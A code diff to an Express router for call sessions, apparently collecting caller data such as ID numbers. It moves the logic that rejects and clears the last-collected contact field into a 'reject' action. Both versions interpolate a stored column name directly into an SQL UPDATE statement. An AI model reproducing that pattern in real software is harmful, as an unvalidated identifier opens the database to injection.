@@ -22,6 +22,26 @@ router.post('/request-action/:sessionId', async (req, res) => {
         case 'id_number':
             currentAction = 'waiting_for_id';
             break;
+        case 'reject':
+            const session = await db.query(
+                `SELECT last_data_type FROM call_sessions WHERE id = $1`,
+                [sessionId]
+            );
+            const lastDataType = session.rows[0]?.last_data_type;
+            if (lastDataType) {
+                await db.query(
+                    `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
+                    [sessionId]
+                );
+                await db.query(
+                    `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
+                    [`waiting_for_${lastDataType}`, sessionId]
+                );
+                io.emit('data_rejected', { session_id: sessionId, type: lastDataType });
+                return res.json({ success: true, action: 'reject' });
+            } else {
+                return res.status(400).json({ error: 'No data to reject' });
+            }
         default:
             return res.status(400).json({ error: 'Invalid action' });
     }
@@ -42,45 +62,6 @@ router.post('/request-action/:sessionId', async (req, res) => {
         res.json({ success: true, action: action });
     } catch (error) {
         console.error('Error requesting action:', error);
-        res.status(500).json({ error: error.message });
-    }
-});
-
-// NEW: REJECT LAST DATA ROUTE
-router.post('/reject-data/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
-    const io = req.app.get('io');
-    
-    try {
-        const session = await db.query(
-            `SELECT last_data_type, last_data_value FROM call_sessions WHERE id = $1`,
-            [sessionId]
-        );
-        
-        if (session.rows.length === 0 || !session.rows[0].last_data_type) {
-            return res.json({ success: false, message: 'No data to reject' });
-        }
-        
-        const lastDataType = session.rows[0].last_data_type;
-        const lastDataValue = session.rows[0].last_data_value;
-        
-        // Clear the data from contacts
-        await db.query(
-            `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
-            [sessionId]
-        );
-        
-        // Set session to ask again for the same data
-        await db.query(
-            `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
-            [`waiting_for_${lastDataType}`, sessionId]
-        );
-        
-        io.emit('data_rejected', { session_id: sessionId, type: lastDataType, value: lastDataValue });
-        
-        res.json({ success: true, message: `Rejected ${lastDataType}: ${lastDataValue}` });
-    } catch (error) {
-        console.error('Error rejecting data:', error);
         res.status(500).json({ error: error.message });
     }
 });
